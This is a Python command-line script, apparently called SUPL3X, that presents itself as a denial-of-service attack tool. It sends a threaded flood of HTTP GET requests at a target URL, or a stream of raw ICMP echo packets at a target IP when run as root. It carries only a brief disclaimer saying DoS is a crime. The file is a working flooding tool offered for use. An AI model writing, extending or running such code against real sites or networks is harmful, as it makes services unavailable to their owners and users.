# Imports
import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
import sys
import socket
import os
import random
import validators

print(''' ____  _   _ ____  _     _______  __
/ ___|| | | |  _ \| |   |___ /\ \/ /
\___ \| | | | |_) | |     |_ \ \  / 
 ___) | |_| |  __/| |___ ___) |/  \ 
|____/ \___/|_|   |_____|____//_/\_\ ''')

print('\n\n\033[91mWARNING:\033[0m A DoS attack involves overwhelming an online service, rendering it inaccessible. Its practice is considered a crime, so use the tool wisely. \nWe are not responsible for individual user actions.\n')

# Argumentos
parser = argparse.ArgumentParser(description='DoS attack tool')

group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-w', '--web', type=str, help='Set the target as a website.')
group.add_argument('-n', '--network', type=str, help='Set the target as an internet network.')

parser.add_argument('-r', '--requests', type=int, default=100000, help='Number of requests to send (default: 100000)')
parser.add_argument('-t', '--threads', type=int, default=60, help='Number of threads to use (default: 60)')
args = parser.parse_args()

# Validators
if args.web:
    isValid = validators.url(args.web)
    if not isValid:
        print('Invalid URL')
        sys.exit(1)
    target_web = args.web
else:
    isValid = validators.ipv4(args.network)
    if not isValid:
        print('Invalid IP address')
        sys.exit(1)
    target_network = args.network

if not args.web and not args.network:
    parser.error('Please specify either a URL (-w) or an IP address (-n).')

# Web DoS
if args.web:
    def send_request(web):
        try:
            response = requests.get(web)
            print(f'Status code for {web}: {response.status_code}')
        except requests.RequestException as e:
            print(f'\033[91mError\033[0m accessing {web}: {e}')

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(send_request, [target_web] * args.requests)

# Network DoS
if args.network:
    def send_ping(network):
        icmp = socket.getprotobyname('icmp')
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        except socket.error as e:
            print(f'Socket creation error: {e}')
            return

        packet_id = int((id(os) * random.random()) % 65535)
        packet_checksum = 0
        packet = bytearray([8, 0, 0, 0, packet_id // 256, packet_id % 256, packet_checksum // 256, packet_checksum % 256])

        for _ in range(args.requests):
            try:
                sock.sendto(packet, (network, 0))
                print(f'Ping sent to {network}')
            except socket.error as e:
                print(f'Error sending ping: {e}')
                break
        sock.close()

    if __name__ == '__main__':
        if os.geteuid() != 0:
            print('Root permissions are required to run this script for network attacks.')
            sys.exit(1)
        send_ping(args.network)
        print('Attack completed.')
